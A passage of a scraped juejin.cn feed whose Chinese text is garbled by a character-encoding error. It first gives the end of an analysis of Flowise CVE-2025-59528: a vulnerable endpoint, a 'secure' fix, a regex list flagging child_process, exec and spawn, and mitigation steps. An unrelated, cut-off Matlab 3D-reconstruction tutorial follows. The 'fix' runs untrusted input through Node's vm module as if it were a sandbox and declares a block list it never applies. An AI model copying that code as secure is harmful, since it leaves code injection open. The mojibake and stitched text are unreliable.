<span class="hljs-comment">// èŠ‚ç‚¹åŠ è½½æ–¹æ³•APIç«¯ç‚¹</span>

<span class="hljs-comment">/**
 * å¤„ç†èŠ‚ç‚¹åŠ è½½è¯·æ±‚
 * POST /api/v1/node-load-method/customMCP
 */</span>
router.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/node-load-method/customMCP'</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { mcpServerConfig } = req.<span class="hljs-property">body</span>;
  
  <span class="hljs-comment">// ğŸš¨ ç›´æ¥ä¼ é€’ç”¨æˆ·è¾“å…¥åˆ°æ¼æ´å‡½æ•°</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">handleCustomMCPConfig</span>(mcpServerConfig);
  
  res.<span class="hljs-title function_">json</span>({
    <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">data</span>: result
  });
});
</code></pre>
<p><strong>ä»£ç åˆ†æï¼š</strong></p>
<ul>
<li>ç›´æ¥æ¥æ”¶è¯·æ±‚ä½“ä¸­çš„<code>mcpServerConfig</code>å‚æ•°</li>
<li>ç¼ºå°‘è¾“å…¥éªŒè¯å’Œæ¸…ç†æ­¥éª¤</li>
<li>ç›´æ¥ä¼ é€’åˆ°å­˜åœ¨æ¼æ´çš„å¤„ç†å‡½æ•°</li>
</ul>
<h3 data-id="heading-18">3. ä¿®å¤åçš„å®‰å…¨ä»£ç </h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¿®å¤ç‰ˆæœ¬ 3.0.6+</span>
<span class="hljs-comment">// packages/server/src/nodes/CustomMCP.ts</span>

<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> vm <span class="hljs-keyword">from</span> <span class="hljs-string">'vm'</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> util <span class="hljs-keyword">from</span> <span class="hljs-string">'util'</span>;

<span class="hljs-comment">/**
 * å®‰å…¨å¤„ç†CustomMCPé…ç½®
 * <span class="hljs-doctag">@param</span> config ç”¨æˆ·æä¾›çš„é…ç½®å­—ç¬¦ä¸²
 * <span class="hljs-doctag">@returns</span> å®‰å…¨çš„é…ç½®å¯¹è±¡
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">safeParseMCPConfig</span>(<span class="hljs-params">config: string</span>): any {
  <span class="hljs-comment">// âœ… ä¿®å¤ï¼šä½¿ç”¨JSON.parseæ›¿ä»£Function</span>
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å…ˆå°è¯•JSON.parseè§£æ</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(config);
  } <span class="hljs-keyword">catch</span> (jsonError) {
    <span class="hljs-comment">// å¦‚æœä¸æ˜¯æœ‰æ•ˆçš„JSONï¼Œå°è¯•å®‰å…¨è§£æ</span>
    
    <span class="hljs-comment">// åˆ›å»ºå®‰å…¨çš„æ²™ç®±ç¯å¢ƒ</span>
    <span class="hljs-keyword">const</span> sandbox = {
      <span class="hljs-variable language_">console</span>,
      <span class="hljs-title class_">Buffer</span>,
      <span class="hljs-variable constant_">URL</span>,
      <span class="hljs-title class_">TextEncoder</span>,
      <span class="hljs-title class_">TextDecoder</span>,
      <span class="hljs-comment">// é™åˆ¶è®¿é—®å±é™©æ¨¡å—</span>
      <span class="hljs-attr">process</span>: {
        <span class="hljs-attr">env</span>: {},
        <span class="hljs-attr">cwd</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">'/tmp'</span>,
        <span class="hljs-attr">version</span>: process.<span class="hljs-property">version</span>
      }
    };
    
    <span class="hljs-comment">// ç¦æ­¢è®¿é—®çš„å±æ€§å’Œå‡½æ•°</span>
    <span class="hljs-keyword">const</span> blocked = [
      <span class="hljs-string">'require'</span>,
      <span class="hljs-string">'global'</span>,
      <span class="hljs-string">'module'</span>,
      <span class="hljs-string">'exports'</span>,
      <span class="hljs-string">'__dirname'</span>,
      <span class="hljs-string">'__filename'</span>,
      <span class="hljs-string">'eval'</span>,
      <span class="hljs-string">'Function'</span>
    ];
    
    <span class="hljs-comment">// è®¾ç½®ä¸Šä¸‹æ–‡</span>
    <span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
    
    <span class="hljs-comment">// æ‰§è¡Œå®‰å…¨è„šæœ¬</span>
    <span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">`(<span class="hljs-subst">${config}</span>)`</span>, {
      <span class="hljs-attr">timeout</span>: <span class="hljs-number">100</span>,
      <span class="hljs-attr">displayErrors</span>: <span class="hljs-literal">true</span>
    });
    
    <span class="hljs-keyword">return</span> script.<span class="hljs-title function_">runInContext</span>(context);
  }
}

<span class="hljs-comment">/**
 * å¢å¼ºçš„å®‰å…¨é…ç½®éªŒè¯
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">validateMCPConfigStructure</span>(<span class="hljs-params">config: any</span>): boolean {
  <span class="hljs-keyword">const</span> allowedKeys = [<span class="hljs-string">'name'</span>, <span class="hljs-string">'version'</span>, <span class="hljs-string">'settings'</span>, <span class="hljs-string">'endpoints'</span>];
  <span class="hljs-keyword">const</span> configKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(config);
  
  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰ä¸å…è®¸çš„é”®</span>
  <span class="hljs-keyword">return</span> configKeys.<span class="hljs-title function_">every</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> allowedKeys.<span class="hljs-title function_">includes</span>(key));
}
</code></pre>
<p><strong>ä¿®å¤è¦ç‚¹ï¼š</strong></p>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨JSON.parse</strong>ï¼šé¿å…ç›´æ¥æ‰§è¡ŒJavaScript</li>
<li><strong>æ²™ç®±ç¯å¢ƒ</strong>ï¼šä½¿ç”¨Node.jsçš„vmæ¨¡å—åˆ›å»ºéš”ç¦»ç¯å¢ƒ</li>
<li><strong>è®¿é—®é™åˆ¶</strong>ï¼šé™åˆ¶å¯¹å±é™©æ¨¡å—å’Œå…¨å±€å¯¹è±¡çš„è®¿é—®</li>
<li><strong>è¶…æ—¶æ§åˆ¶</strong>ï¼šè®¾ç½®æ‰§è¡Œè¶…æ—¶ï¼Œé˜²æ­¢æ— é™å¾ªç¯</li>
<li><strong>è¾“å…¥éªŒè¯</strong>ï¼šéªŒè¯é…ç½®ç»“æ„ï¼Œåªå…è®¸é¢„å®šä¹‰çš„é”®</li>
</ol>
<h3 data-id="heading-19">4. å®‰å…¨ä¸­é—´ä»¶ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®‰å…¨é˜²æŠ¤ä¸­é—´ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">securityMiddleware</span>(<span class="hljs-params">req, res, next</span>) {
  <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚è·¯å¾„</span>
  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">path</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node-load-method'</span>)) {
    <span class="hljs-keyword">const</span> contentType = req.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Content-Type'</span>);
    
    <span class="hljs-comment">// éªŒè¯Content-Type</span>
    <span class="hljs-keyword">if</span> (!contentType || !contentType.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'application/json'</span>)) {
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({
        <span class="hljs-attr">error</span>: <span class="hljs-string">'Invalid Content-Type'</span>
      });
    }
    
    <span class="hljs-comment">// æ£€æŸ¥è¯·æ±‚ä½“å¤§å°é™åˆ¶</span>
    <span class="hljs-keyword">const</span> contentLength = <span class="hljs-built_in">parseInt</span>(req.<span class="hljs-title function_">get</span>(<span class="hljs-string">'Content-Length'</span>) || <span class="hljs-string">'0'</span>);
    <span class="hljs-keyword">if</span> (contentLength &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">10</span>) { <span class="hljs-comment">// é™åˆ¶10KB</span>
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">413</span>).<span class="hljs-title function_">json</span>({
        <span class="hljs-attr">error</span>: <span class="hljs-string">'Payload too large'</span>
      });
    }
  }
  
  <span class="hljs-title function_">next</span>();
}

<span class="hljs-comment">// åº”ç”¨å®‰å…¨ä¸­é—´ä»¶</span>
app.<span class="hljs-title function_">use</span>(securityMiddleware);
</code></pre>
<h2 data-id="heading-20">ğŸ“Š å½±å“è¯„ä¼°</h2>













































<table><thead><tr><th>å½±å“ç»´åº¦</th><th>ç­‰çº§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æœºå¯†æ€§å½±å“</strong></td><td>ğŸ”¥ å®Œå…¨ä¸§å¤±</td><td>æ”»å‡»è€…å¯è®¿é—®ä»»æ„æ–‡ä»¶ã€ç¯å¢ƒå˜é‡å’Œæ•æ„Ÿæ•°æ®</td></tr><tr><td><strong>å®Œæ•´æ€§å½±å“</strong></td><td>ğŸ”¥ å®Œå…¨ä¸§å¤±</td><td>æ”»å‡»è€…å¯ä¿®æ”¹æˆ–åˆ é™¤ä»»æ„ç³»ç»Ÿæ–‡ä»¶å’Œæ•°æ®</td></tr><tr><td><strong>å¯ç”¨æ€§å½±å“</strong></td><td>ğŸ”¥ å®Œå…¨ä¸§å¤±</td><td>æ”»å‡»è€…å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¯¼è‡´æœåŠ¡ä¸­æ–­</td></tr><tr><td><strong>æ”»å‡»å‘é‡</strong></td><td>ğŸŒ è¿œç¨‹</td><td>é€šè¿‡ç½‘ç»œå³å¯å‘èµ·æ”»å‡»</td></tr><tr><td><strong>èº«ä»½éªŒè¯è¦æ±‚</strong></td><td>âŒ æ— éœ€è®¤è¯</td><td>æ— éœ€ä»»ä½•èº«ä»½éªŒè¯å³å¯åˆ©ç”¨</td></tr><tr><td><strong>ç”¨æˆ·äº¤äº’è¦æ±‚</strong></td><td>âŒ æ— éœ€äº¤äº’</td><td>æ— éœ€å—å®³è€…äº¤äº’</td></tr><tr><td><strong>æ€»ä½“ä¸¥é‡æ€§</strong></td><td>â­ ä¸¥é‡ (10.0)</td><td>CVSSæœ€é«˜å±é™©ç­‰çº§</td></tr></tbody></table>
<h2 data-id="heading-21">ğŸ”’ ç¼“è§£æªæ–½</h2>
<h3 data-id="heading-22">ç«‹å³æªæ–½</h3>
<ol>
<li>
<p><strong>å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npm update flowise@3.0.6
</code></pre>
</li>
<li>
<p><strong>ç½‘ç»œéš”ç¦»</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨é˜²ç«å¢™é™åˆ¶è®¿é—®</span>
iptables -A INPUT -p tcp --dport 3000 -s trusted_ip -j ACCEPT
iptables -A INPUT -p tcp --dport 3000 -j DROP
</code></pre>
</li>
<li>
<p><strong>ç›‘æ§æ£€æµ‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç›‘æ§å¯ç–‘æ´»åŠ¨</span>
<span class="hljs-keyword">const</span> suspiciousPatterns = [
  <span class="hljs-regexp">/child_process/</span>,
  <span class="hljs-regexp">/exec\(/</span>,
  <span class="hljs-regexp">/spawn\(/</span>,
  <span class="hljs-regexp">/fs\./</span>,
  <span class="hljs-regexp">/require\(.*\)/</span>
];

<span class="hljs-keyword">function</span> <span class="hljs-title function_">monitorRequests</span>(<span class="hljs-params">req, res, next</span>) {
  <span class="hljs-keyword">const</span> bodyString = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(req.<span class="hljs-property">body</span>);
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> pattern <span class="hljs-keyword">of</span> suspiciousPatterns) {
    <span class="hljs-keyword">if</span> (pattern.<span class="hljs-title function_">test</span>(bodyString)) {
      <span class="hljs-title function_">logSecurityAlert</span>(req);
      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">'Forbidden'</span>);
    }
  }
  
  <span class="hljs-title function_">next</span>();
}
</code></pre>
</li>
</ol>
<h3 data-id="heading-23">é•¿æœŸé˜²æŠ¤</h3>
<ol>
<li>
<p><strong>å®‰å…¨å¼€å‘å®è·µ</strong>ï¼š</p>
<ul>
<li>å®æ–½ä»£ç å®‰å…¨å®¡æŸ¥</li>
<li>ä½¿ç”¨é™æ€ä»£ç åˆ†æå·¥å…·</li>
<li>å®šæœŸå®‰å…¨åŸ¹è®­</li>
</ul>
</li>
<li>
<p><strong>æ·±åº¦é˜²å¾¡ç­–ç•¥</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¤šå±‚é˜²å¾¡ç¤ºä¾‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityLayer</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">sanitizeInput</span>(<span class="hljs-params">input</span>) {
    <span class="hljs-comment">// è¾“å…¥æ¸…ç†</span>
    <span class="hljs-comment">// ç™½åå•éªŒè¯</span>
    <span class="hljs-comment">// ç¼–ç å¤„ç†</span>
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">validateStructure</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-comment">// ç»“æ„éªŒè¯</span>
    <span class="hljs-comment">// ç±»å‹æ£€æŸ¥</span>
    <span class="hljs-comment">// å¤§å°é™åˆ¶</span>
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">executeSafely</span>(<span class="hljs-params">code</span>) {
    <span class="hljs-comment">// æ²™ç®±æ‰§è¡Œ</span>
    <span class="hljs-comment">// èµ„æºé™åˆ¶</span>
    <span class="hljs-comment">// è¶…æ—¶æ§åˆ¶</span>
  }
}
</code></pre>
</li>
</ol>
<h2 data-id="heading-24">ğŸ¯ æ€»ç»“</h2>
<p>CVE-2025-59528æ˜¯ä¸€ä¸ªå…¸å‹çš„<strong>ä¸å®‰å…¨çš„ä»£ç æ‰§è¡Œ</strong>æ¼æ´æ¡ˆä¾‹ï¼Œæé†’å¼€å‘è€…åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥æ—¶éœ€è¦æ ¼å¤–å°å¿ƒã€‚å…³é”®æ•™è®­åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>æ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·è¾“å…¥</strong>ï¼šæ‰€æœ‰è¾“å…¥éƒ½åº”è§†ä¸ºæ½œåœ¨æ¶æ„</li>
<li><strong>é¿å…ä½¿ç”¨evalå’ŒFunction</strong>ï¼šè¿™äº›å‡½æ•°ææ˜“å¯¼è‡´ä»£ç æ³¨å…¥</li>
<li><strong>å®æ–½æ·±åº¦é˜²å¾¡</strong>ï¼šå¤šå±‚å®‰å…¨æªæ–½æ¯”å•ä¸€é˜²æŠ¤æ›´æœ‰æ•ˆ</li>
<li><strong>åŠæ—¶æ›´æ–°ä¾èµ–</strong>ï¼šå·²çŸ¥æ¼æ´å¿…é¡»ç¬¬ä¸€æ—¶é—´ä¿®å¤</li>
<li><strong>ç›‘æ§å¼‚å¸¸æ´»åŠ¨</strong>ï¼šå®æ—¶ç›‘æ§å¯åŠæ—¶å‘ç°æ”»å‡»è¡Œä¸º</li>
</ol>
<p>é€šè¿‡ç†è§£è¿™ä¸ªæ¼æ´çš„æˆå› å’Œä¿®å¤æ–¹æ³•ï¼Œå¼€å‘è€…å¯ä»¥æ›´å¥½åœ°ä¿æŠ¤è‡ªå·±çš„Node.jsåº”ç”¨å…å—ç±»ä¼¼æ”»å‡»ã€‚
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAP0Ip+gb1zBQc+RNUwJQtsk</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¦‚ä½•ä½¿ç”¨Matlabè¿›è¡Œä¸‰ç»´é‡å»ºï¼Ÿ]]></title>    <link>https://juejin.cn/post/7594851429163155490</link>    <guid>https://juejin.cn/post/7594851429163155490</guid>    <pubDate>2026-01-14T14:49:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429163155490" data-draft-id="7594851429163139106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¦‚ä½•ä½¿ç”¨Matlabè¿›è¡Œä¸‰ç»´é‡å»ºï¼Ÿ"/> <meta itemprop="keywords" content="MATLAB"/> <meta itemprop="datePublished" content="2026-01-14T14:49:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹å‘˜å¤–"/> <meta itemprop="url" content="https://juejin.cn/user/4496334519809408"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¦‚ä½•ä½¿ç”¨Matlabè¿›è¡Œä¸‰ç»´é‡å»ºï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4496334519809408/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹å‘˜å¤–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:49:05.000Z" title="Wed Jan 14 2026 14:49:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Matlabå®ç°ä¸‰ç»´é‡å»ºçš„æ ¸å¿ƒæµç¨‹æ˜¯ï¼š<strong>ç›¸æœºæ ‡å®šï¼ˆè·å–ç›¸æœºå‚æ•°ï¼‰â†’ å›¾åƒç‰¹å¾åŒ¹é… â†’ ä¸‰ç»´ç‚¹äº‘ç”Ÿæˆï¼ˆç¨€ç–â†’ç¨ å¯†ï¼‰â†’ ç½‘æ ¼é‡å»ºä¸å¯è§†åŒ–</strong>ï¼Œä»¥ä¸‹æ˜¯åˆ†æ­¥æ‹†è§£çš„å®æ“æ•™ç¨‹ï¼ŒåŒ…å«å¯ç›´æ¥è¿è¡Œçš„ä»£ç å’Œå…³é”®ç»†èŠ‚ï¼š</p>
<h3 data-id="heading-0">ä¸€ã€å‰æœŸå‡†å¤‡</h3>
<ol>
<li><strong>ç¡¬ä»¶/å›¾åƒè¦æ±‚</strong>ï¼š
<ul>
<li>æ‹æ‘„10-20å¼ åŒä¸€ç‰©ä½“/åœºæ™¯çš„å¤šè§’åº¦å›¾åƒï¼ˆé‡å ç‡â‰¥60%ï¼‰ï¼Œé¿å…å¼ºå…‰/é€†å…‰ï¼Œä¿è¯çº¹ç†ä¸°å¯Œï¼›</li>
<li>å‡†å¤‡æ£‹ç›˜æ ¼æ ‡å®šæ¿ï¼ˆå¦‚9Ã—6å†…è§’ç‚¹ï¼Œæ ¼å­è¾¹é•¿20mmï¼‰ï¼Œæ‹æ‘„15-20å¼ ä¸åŒè§’åº¦çš„æ ‡å®šæ¿å›¾åƒï¼ˆç”¨äºç›¸æœºæ ‡å®šï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å·¥å…·ç®±æ£€æŸ¥</strong>ï¼šç¡®ä¿Matlabå®‰è£…<code>Computer Vision Toolbox</code>ã€<code>Image Processing Toolbox</code>ã€<code>3D Computer Vision Toolbox</code>ï¼Œå¯é€šè¿‡<code>ver</code>å‘½ä»¤éªŒè¯ã€‚</li>
</ol>
<h3 data-id="heading-1">äºŒã€æ­¥éª¤1ï¼šç›¸æœºæ ‡å®šï¼ˆæ ¸å¿ƒå‰æï¼‰</h3>
<p>ç›¸æœºæ ‡å®šç”¨äºæ¶ˆé™¤é•œå¤´ç•¸å˜ï¼Œè·å–ç›¸æœºå†…å‚ï¼ˆç„¦è·ã€ä¸»ç‚¹ï¼‰å’Œå¤–å‚ï¼ˆä½å§¿ï¼‰ï¼Œæ˜¯ä¸‰ç»´é‡å»ºçš„åŸºç¡€ã€‚</p>
<pre><code class="hljs language-matlab" lang="matlab"><span class="hljs-comment">% 1. è¯»å–æ ‡å®šæ¿å›¾åƒï¼ˆå°†è·¯å¾„æ›¿æ¢ä¸ºä½ çš„æ ‡å®šæ¿å›¾åƒæ–‡ä»¶å¤¹ï¼‰</span>
calib_img_path = <span class="hljs-string">'calibration_board_images/'</span>; <span class="hljs-comment">% å­˜æ”¾æ ‡å®šæ¿ç…§ç‰‡çš„æ–‡ä»¶å¤¹</span>
calib_imgs = imageDatastore(calib_img_path);

<span class="hljs-comment">% 2. è®¾ç½®æ ‡å®šæ¿å‚æ•°ï¼ˆæ ¹æ®å®é™…æ ‡å®šæ¿ä¿®æ”¹ï¼‰</span>
boardSize = [<span class="hljs-number">9</span>,<span class="hljs-number">6</span>];    <span class="hljs-comment">% æ£‹ç›˜æ ¼å†…è§’ç‚¹æ•°é‡ï¼ˆè¡ŒÃ—åˆ—ï¼‰</span>
squareSize = <span class="hljs-number">20</span>;      <span class="hljs-comment">% æ£‹ç›˜æ ¼å•ä¸ªæ ¼å­è¾¹é•¿ï¼Œå•ä½mm</span>

<span class="hljs-comment">% 3. æ‰§è¡Œç›¸æœºæ ‡å®š</span>
[cam_params, used_imgs, reproj_errors] = estimateCameraParameters(...
    calib_imgs, ...
    <span class="hljs-string">'CheckerboardSize'</span>, boardSize, ...
    <span class="hljs-string">'SquareSize'</span>, squareSize, ...
    <span class="hljs-string">'EstimateSkew'</span>, <span class="hljs-built_in">false</span>, ...  <span class="hljs-comment">% ä¸€èˆ¬æ— éœ€ä¼°è®¡å€¾æ–œå‚æ•°</span>
    <span class="hljs-string">'EstimateTangentialDistortion'</span>, <span class="hljs-built_in">true</span>); <span class="hljs-comment">% ä¼°è®¡åˆ‡å‘ç•¸å˜</span>

<span class="hljs-comment">% 4. éªŒè¯æ ‡å®šæ•ˆæœï¼ˆé‡æŠ•å½±è¯¯å·®&lt;0.5åƒç´ ä¸ºåˆæ ¼ï¼‰</span>
<span class="hljs-built_in">figure</span>; showReprojectionErrors(cam_params);
title(<span class="hljs-string">'ç›¸æœºæ ‡å®šé‡æŠ•å½±è¯¯å·®'</span>);
</code></pre>
<p><strong>å…³é”®è¯´æ˜</strong>ï¼šè‹¥é‡æŠ•å½±è¯¯å·®è¿‡å¤§ï¼ˆ&gt;1åƒç´ ï¼‰ï¼Œéœ€é‡æ–°æ‹æ‘„æ ‡å®šæ¿å›¾åƒï¼ˆå¢åŠ è§’åº¦ã€ä¿è¯æ£‹ç›˜æ ¼å®Œæ•´ï¼‰ã€‚</p>
<h3 data-id="heading-2">ä¸‰ã€æ­¥éª¤2ï¼šç‰¹å¾æå–ä¸å¤šè§†å›¾åŒ¹é…</h3>
<p>å¯¹é‡å»ºå›¾åƒæå–SIFTç‰¹å¾å¹¶å®Œæˆè·¨å›¾åƒåŒ¹é…ï¼Œä¸ºåç»­ä¸‰ç»´ç‚¹äº‘ç”Ÿæˆæä¾›å¯¹åº”å…³ç³»ã€‚</p>
<pre><code class="hljs language-matlab" lang="matlab"><span class="hljs-comment">% 1. è¯»å–å¾…é‡å»ºçš„å¤šè§’åº¦å›¾åƒï¼ˆæ›¿æ¢ä¸ºä½ çš„å›¾åƒè·¯å¾„ï¼‰</span>
